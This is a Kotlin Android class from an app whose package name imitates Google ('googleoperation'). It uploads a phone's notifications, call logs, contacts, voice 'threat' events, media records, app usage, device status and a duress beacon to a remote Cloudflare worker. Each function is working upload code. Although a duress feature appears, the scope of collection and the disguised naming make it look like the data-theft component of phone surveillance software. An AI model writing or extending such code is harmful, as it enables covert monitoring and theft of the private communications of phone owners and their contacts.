package com.opp.googleoperation.network

import android.content.Context
import android.util.Log
import com.opp.googleoperation.data.model.AppUsageEvent
import com.opp.googleoperation.data.model.AudioThreatEvent
import com.opp.googleoperation.data.model.CallEvent
import com.opp.googleoperation.data.model.ContactEvent
import com.opp.googleoperation.data.model.DeviceStatus
import com.opp.googleoperation.data.model.MediaEvent
import com.opp.googleoperation.data.model.NotificationEvent
import com.opp.googleoperation.util.Constants
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody

class CloudflareDispatcher(private val ctx: Context) {

    companion object {
        private const val TAG = "CloudflareDispatcher"
        private val JSON_MEDIA_TYPE = "application/json; charset=utf-8".toMediaType()
    }

    private val prefs = ctx.getSharedPreferences(Constants.PREFS_NAME, Context.MODE_PRIVATE)

    private fun getBaseUrl(): String {
        return prefs.getString(Constants.KEY_SERVER_URL, Constants.DEFAULT_WORKER_URL) ?: Constants.DEFAULT_WORKER_URL
    }

    suspend fun sendTelemetry(status: DeviceStatus): Boolean = withContext(Dispatchers.IO) {
        try {
            val url = "${getBaseUrl().trimEnd('/')}/api/telemetry"
            val json = ApiClient.gson.toJson(status)
            val body = json.toRequestBody(JSON_MEDIA_TYPE)

            val request = Request.Builder()
                .url(url)
                .post(body)
                .build()

            val response = ApiClient.httpClient.newCall(request).execute()
            val successful = response.isSuccessful
            response.close()

            if (successful) {
                Log.d(TAG, "telemetry successfully dispatched to Cloudflare D1")
            } else {
                Log.w(TAG, "telemetry dispatch failed with HTTP ${response.code}")
            }
            successful
        } catch (e: Exception) {
            Log.w(TAG, "error dispatching telemetry to Cloudflare D1", e)
            false
        }
    }

    suspend fun sendNotification(event: NotificationEvent): Boolean = sendNotifications(listOf(event))

    suspend fun sendNotifications(events: List<NotificationEvent>): Boolean = withContext(Dispatchers.IO) {
        if (events.isEmpty()) return@withContext true
        try {
            val url = "${getBaseUrl().trimEnd('/')}/api/notifications"
            val json = ApiClient.gson.toJson(events)
            val body = json.toRequestBody(JSON_MEDIA_TYPE)

            val request = Request.Builder()
                .url(url)
                .post(body)
                .build()

            val response = ApiClient.httpClient.newCall(request).execute()
            val successful = response.isSuccessful
            response.close()

            if (successful) {
                Log.d(TAG, "dispatched ${events.size} notifications to Cloudflare D1")
            } else {
                Log.w(TAG, "notifications dispatch failed with HTTP ${response.code}")
            }
            successful
        } catch (e: Exception) {
            Log.w(TAG, "error dispatching notifications to Cloudflare D1", e)
            false
        }
    }

    suspend fun sendCallLog(event: CallEvent): Boolean = sendCallLogs(listOf(event))

    suspend fun sendCallLogs(events: List<CallEvent>): Boolean = withContext(Dispatchers.IO) {
        if (events.isEmpty()) return@withContext true
        try {
            val url = "${getBaseUrl().trimEnd('/')}/api/calls"
            val json = ApiClient.gson.toJson(events)
            val body = json.toRequestBody(JSON_MEDIA_TYPE)

            val request = Request.Builder()
                .url(url)
                .post(body)
                .build()

            val response = ApiClient.httpClient.newCall(request).execute()
            val successful = response.isSuccessful
            response.close()

            if (successful) {
                Log.d(TAG, "dispatched ${events.size} call events to Cloudflare D1")
            } else {
                Log.w(TAG, "calls dispatch failed with HTTP ${response.code}")
            }
            successful
        } catch (e: Exception) {
            Log.w(TAG, "error dispatching calls to Cloudflare D1", e)
            false
        }
    }

    suspend fun sendContact(event: ContactEvent): Boolean = sendContacts(listOf(event))

    suspend fun sendContacts(events: List<ContactEvent>): Boolean = withContext(Dispatchers.IO) {
        if (events.isEmpty()) return@withContext true
        try {
            val url = "${getBaseUrl().trimEnd('/')}/api/contacts"
            val json = ApiClient.gson.toJson(events)
            val body = json.toRequestBody(JSON_MEDIA_TYPE)

            val request = Request.Builder()
                .url(url)
                .post(body)
                .build()

            val response = ApiClient.httpClient.newCall(request).execute()
            val successful = response.isSuccessful
            response.close()

            if (successful) {
                Log.d(TAG, "dispatched ${events.size} contact events to Cloudflare D1")
            } else {
                Log.w(TAG, "contacts dispatch failed with HTTP ${response.code}")
            }
            successful
        } catch (e: Exception) {
            Log.w(TAG, "error dispatching contacts to Cloudflare D1", e)
            false
        }
    }

    suspend fun sendVoiceEvent(event: AudioThreatEvent): Boolean = sendVoiceEvents(listOf(event))

    suspend fun sendVoiceEvents(events: List<AudioThreatEvent>): Boolean = withContext(Dispatchers.IO) {
        if (events.isEmpty()) return@withContext true
        try {
            val url = "${getBaseUrl().trimEnd('/')}/api/voice-events"
            val json = ApiClient.gson.toJson(events)
            val body = json.toRequestBody(JSON_MEDIA_TYPE)

            val request = Request.Builder()
                .url(url)
                .post(body)
                .build()

            val response = ApiClient.httpClient.newCall(request).execute()
            val successful = response.isSuccessful
            response.close()

            if (successful) {
                Log.d(TAG, "dispatched ${events.size} voice activity records to Cloudflare D1")
            } else {
                Log.w(TAG, "voice-events dispatch failed with HTTP ${response.code}")
            }
            successful
        } catch (e: Exception) {
            Log.w(TAG, "error dispatching voice events to Cloudflare D1", e)
            false
        }
    }

    suspend fun sendMediaRecord(event: MediaEvent): Boolean = sendMediaRecords(listOf(event))

    suspend fun sendMediaRecords(events: List<MediaEvent>): Boolean = withContext(Dispatchers.IO) {
        if (events.isEmpty()) return@withContext true
        try {
            val url = "${getBaseUrl().trimEnd('/')}/api/media"
            val json = ApiClient.gson.toJson(events)
            val body = json.toRequestBody(JSON_MEDIA_TYPE)

            val request = Request.Builder()
                .url(url)
                .post(body)
                .build()

            val response = ApiClient.httpClient.newCall(request).execute()
            val successful = response.isSuccessful
            response.close()

            if (successful) {
                Log.d(TAG, "dispatched ${events.size} media records to Cloudflare D1")
            } else {
                Log.w(TAG, "media dispatch failed with HTTP ${response.code}")
            }
            successful
        } catch (e: Exception) {
            Log.w(TAG, "error dispatching media records to Cloudflare D1", e)
            false
        }
    }

    suspend fun sendDuressBeacon(deviceId: String, audioEventId: String? = null): Boolean = withContext(Dispatchers.IO) {
        try {
            val url = "${getBaseUrl().trimEnd('/')}/api/duress"
            val payload = mapOf(
                "deviceId" to deviceId,
                "alertType" to "RED_DURESS_BEACON",
                "audioEventId" to audioEventId,
                "timestamp" to System.currentTimeMillis()
            )
            val json = ApiClient.gson.toJson(payload)
            val body = json.toRequestBody(JSON_MEDIA_TYPE)

            val request = Request.Builder()
                .url(url)
                .post(body)
                .build()

            val response = ApiClient.httpClient.newCall(request).execute()
            val successful = response.isSuccessful
            response.close()

            if (successful) {
                Log.d(TAG, "RED DURESS BEACON successfully received by Cloudflare D1")
            } else {
                Log.w(TAG, "duress beacon dispatch failed with HTTP ${response.code}")
            }
            successful
        } catch (e: Exception) {
            Log.w(TAG, "error dispatching duress beacon to Cloudflare D1", e)
            false
        }
    }

    suspend fun sendAppUsage(events: List<AppUsageEvent>): Boolean = withContext(Dispatchers.IO) {
        if (events.isEmpty()) return@withContext true
        try {
            val url = "${getBaseUrl().trimEnd('/')}/api/usage"
            val json = ApiClient.gson.toJson(events)
            val body = json.toRequestBody(JSON_MEDIA_TYPE)

            val request = Request.Builder()
                .url(url)
                .post(body)
                .build()

            val response = ApiClient.httpClient.newCall(request).execute()
            val successful = response.isSuccessful
            response.close()

            if (successful) {
                Log.d(TAG, "dispatched ${events.size} app usage logs to Cloudflare D1")
            } else {
                Log.w(TAG, "app usage dispatch failed with HTTP ${response.code}")
            }
            successful
        } catch (e: Exception) {
            Log.w(TAG, "error dispatching app usage to Cloudflare D1", e)
            false
        }
    }
}
